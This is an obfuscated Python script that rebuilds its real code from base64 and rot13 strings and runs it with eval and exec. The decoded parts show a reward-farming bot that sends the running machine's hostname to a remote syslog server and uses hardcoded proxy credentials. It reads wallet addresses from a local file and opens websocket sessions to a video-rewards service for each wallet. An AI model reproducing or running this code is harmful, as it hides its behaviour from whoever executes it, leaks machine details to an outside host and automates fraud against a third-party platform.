
import base64, codecs
magic = 'aW1wb3J0IHJhbmRvbQppbXBvcnQgc3lzCmltcG9ydCB3ZWJzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQganNvbgppbXBvcnQgbG9nZ2luZwppbXBvcnQgc29ja2V0CmltcG9ydCBzc2wKaW1wb3J0IHJlbApmcm9tIGxvZ2dpbmcuaGFuZGxlcnMgaW1wb3J0IFN5c0xvZ0hhbmRsZXIKY2xhc3MgQ29udGV4dEZpbHRlcihsb2dnaW5nLkZpbHRlcik6CiAgICBob3N0bmFtZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpCiAgICBkZWYgZmlsdGVyKHNlbGYsIHJlY29yZCk6CiAgICAgICAgcmVjb3JkLmhvc3RuYW1lID0gQ29udGV4dEZpbHRlci5ob3N0bmFtZQogICAgICAgIHJldHVybiBUcnVlCnN5c2xvZyA9IFN5c0xvZ0hhbmRsZXIoYWRkcmVzcz0oJ2xvZ3MucGFwZXJ0cmFpbGFwcC5jb20nLCAzMzEyOSkpCnN5c2xvZy5hZGRGaWx0ZXIoQ29udGV4dEZpbHRlcigpKQpmb3JtYXQgPSAnJShhc2N0aW1lKXMgJShob3N0bmFtZSlzIEVhcm5pZnkgQm90OiAlKG1lc3NhZ2UpcycKZm9ybWF0dGVyID0gbG9nZ2luZy5Gb3JtYXR0ZXIoZm9ybWF0LCBkYXRlZm10PSclYiAlZCAlSDolTTolUycpCnN5c2xvZy5zZXRGb3JtYXR0ZXIoZm9ybWF0dGVyKQpsb2dnZXIgPSBsb2dnaW5nLmdldExvZ2dlcigpCmxvZ2dlci5hZGRIYW5kbGVyKHN5c2xvZykKbG9nZ2VyLnNldExldmVsKGxvZ2dpbmcuSU5GTykKdXNlcm5hbWUgPSAibWFzc2l2ZSIKcGFzc3dvcmQgPSAiY29ubmVjdDEyMyIKCmNoYW5uZWxzID0gWyIweDZFMTMwRDQxQzY2NTU5QjVEQzYzQ0MzMkUyMzNEOTA3QUJFNDU3QkYiLCIweEE2OUI3QTMwOTJBREYzQTU5OEFCRDQ4RTkzOUYxQjRBQTRCM0FEQjgiLCIweDM0RDA5NEEyQjE5RDk3MDY5ODQ1M'
love = 'QWSExZ5Amt1A0D0EHRjEGt2DwxvYPVjrQxjDwRjZGN5BQDjExASDmuOBQxjDwp4AxRjBGt2DwZmZQESDGx0BGVvYPVjrRR2BHV3DGZjBGWOERLmDGH5BRSPEQD4EGxmBHLkDwEODGEPZ0SRDwtvKDcjpz94rKZtCFOoPvVkBQthAmDhZwRjYwVkBwLkZQNvYNbvAQHhZGH1YwL4YwRlBGb4ZGZmVvjXVwR1AP45AF4mAv4kBGx6Awt5ZlVfPvV0AF45AP40Al42Awb4ZGRjVvjXVwR0AP4kAwthZwR3Ywt4Bwt3BQNvKDbXPtcgp2pmVQ0trlW0rKOyVwbvpzS0MFVfVaMuoUIyVwbkZQNjZQNjZQNjZQNjZQNjZQNjZQNjZQO9Pzcmo25gp2pmVQ0tnaAiov5xqJ1jplugp2pmXDcwoTSmplO3p19yLKDbXGbXPvNtVPOxMJLto25soJImp2SaMFu0nTymYUqmYPOgMKAmLJqyXGbXVPNtVPNtVPNXVPNtVPNtVPNXVPNtVPNtVPOfo2qaMKVhnJ5zolugMKAmLJqyXDbtVPNtVPNtVUOlnJ50XT1yp3AuM2HcPvNtVPNtVPNtq3Zhp2IhMPudp29hoKAaZlxXPvNtVPOxMJLto25sMKWlo3VbqTucplk3pljtMKWlo3VcBtbtVPNtVPNtVUOlnJ50XTIlpz9lXDbtVPNtVPNtVTkiM2qypv5ypaWipvuypaWipvxXPvNtVPOxMJLto25sL2kip2HbqTucplk3pljtL2kip2Isp3EuqUImK2AiMTHfVTAfo3AyK21mMlx6PvNtVPNtVPNtpUWcoaDbVvZwVlOwoT9mMJDtVlZwVvxXVPNtVPNtVPOfo2qaMKVhq2SlozyhMluwoT9mMI9gp2pcPvNtVPNtVPNtPtbtVPNtMTIzVT9hK29jMJ4bqTucplk3plx6PvNtVPNtVPNtq3Zhp2IhMPudp29hoKAaZFxXVPNtVPNtVPO3pl5mMJ5xXTcmo25gp2plXDbtVPNtVPNtVUqmYaAyozDbnaAioz1mMmZcPvNtVPNtVPNtPtbtVPNtMTIzVUqmK3EbpzIuMPu0nTymYTSxMUVfLlkjpz94rFx6PvNtVPNtVPNtPvNtVPNtVPNtnT9mqT'
god = '5hbWUgPSAiZXUuZGMuc21hcnRwcm94eS5jb20iCiAgICAgICAgcG9ydCAgPSAiMjAwMDAiCiAgICAgICAgbXNnMSA9IHsidHlwZSI6ImNoYW5uZWwiLCJ2YWx1ZSI6Y30KICAgICAgICBqc29ubXNnMSA9IGpzb24uZHVtcHMobXNnMSkKICAgICAgICBtc2cyPSB7InR5cGUiOiJ3YWxsZXQiLCJ2YWx1ZSI6YWRkciwidmVyc2lvbiI6IjEifQogICAgICAgIAogICAgICAgIGpzb25tc2cyID0ganNvbi5kdW1wcyhtc2cyKQogICAgICAgIAogICAgICAgIHdlYnNvY2tldC5lbmFibGVUcmFjZShGYWxzZSkKICAgICAgICAKICAgICAgICB3cyA9IHdlYnNvY2tldC5XZWJTb2NrZXRBcHAoIndzczovL2ZhaWNlcy1hcGkuZWRnZXZpZGVvLmNvbSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb25fb3Blbj10aGlzLm9uX29wZW4sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb25fbWVzc2FnZT10aGlzLm9uX21lc3NhZ2UsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb25fZXJyb3I9dGhpcy5vbl9lcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvbl9jbG9zZT10aGlzLm9uX2Nsb3NlKQogICAgICAgIHByaW50KGFkZHIpCiAgICAgICAgd3Mua2VlcF9ydW5uaW5nID1UcnVlIAogICAgICAgIHdzLnJ1bl9mb3JldmVyKCAgaHR0cF9wcm94eV9ob3N0PWhvc3RuYW1lLCBodHRwX3Byb3h5X3BvcnQ9cG9ydCwKICAgICAgICBwcm94eV90eXBlPSJodHRwIiwgaHR0cF9wcm94eV9hdXRoPSh1c2VybmFtZSxwYXNzd29yZCkpCiAgICAKCmFkZHJlc3NlcyA9IFtdCgoKZGVmIHJlYWRfYWRyKCk6CiAgICB3aXRoIG9wZW4oIi4vYWNjb3VudHMudHh0IiwgJ3InKSBhcyBmOgogICA'
destiny = 'tVPNtVTSxVQ0tMv5lMJSxXPxXVPNtVPNtVPOuMPN9VTSxYaAjoTy0XPWpovVcPvNtVPNtVPNtMz9lVTxtnJ4tLJD6PvNtVPNtVPNtVPNtVTSxMUWyp3Aypl5upUOyozDbnF5mpTkcqPtvBvVcJmOqXDbXPaWyLJEsLJElXPxXPzAbVQ0tJmNfZI0XPtcmL3WcpUEsozSgMFN9VPWyLKEsMKujYaO5VtbXPtbtVPNtPtbXnJLtK19hLJ1yK18tCG0tVy9soJScoy9sVwbXVPNtVTMipvOuMTElVTyhVTSxMUWyp3AypmbXVPNtVPNtVPOcozDtCFNjPvNtVPNtVPNtMz9lVTZtnJ4tL2t6PvNtVPNtVPNtVPNtVNbtVPNtVPNtVPNtVPOmo2AeMKEsL2jtCFO3p19yLKDbXDbtVPNtVPNtVPNtVPOgp2pkVQ0trlW0rKOyVwbvL2uuoz5yoPVfVaMuoUIyVwczVagwnTShozIfp1gwKK0vsDbtVPNtVPNtVPNtVPOdp29hoKAaZFN9VTcmo24hMUIgpUZboKAaZFxXVPNtVPNtVPNtVPNtoKAaZw0trlW0rKOyVwbvq2SfoTI0VvjvqzSfqJHvBzSxMUVfVaMypaAco24vBvVkVa0XVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVTcmo25gp2plVQ0tnaAiov5xqJ1jplugp2plXFNtVPNXVPNtVPNtVPNtVPNtMTSyoJ9hK3EbpzIuMPN9VUEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CKAiL2gyqS9woP53p190nUWyLJDfLKWapm0bLJExpvkzVagwnTShozIfp1gwKK0vYUOlo3u5p1fjKFxcPvNtVPNtVPNtVPNtVPZto3VXVPNtVPNtVPNtVPNtVlOxLJIgo25sqTulMJSxYzEuMJ1iovN9VSElqJHXVPNtVPNtVPNtVPNtVlOiptbtVPNtVPNtVPNtVPNwVTEuMJ1ioy90nUWyLJDhp2I0ETSyoJ9hXSElqJHcPvNtVPNtVPNtVPNtVTEuMJ1ioy90nUWyLJDhp3EupaDbXDbtVPNtVPNtVPNtVPO0nJ1yYaAfMJIjXQRjXDbtVPNtVPNtVTyhMPN9VTyhMPNeVQRXVPNtVPNtVPN='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
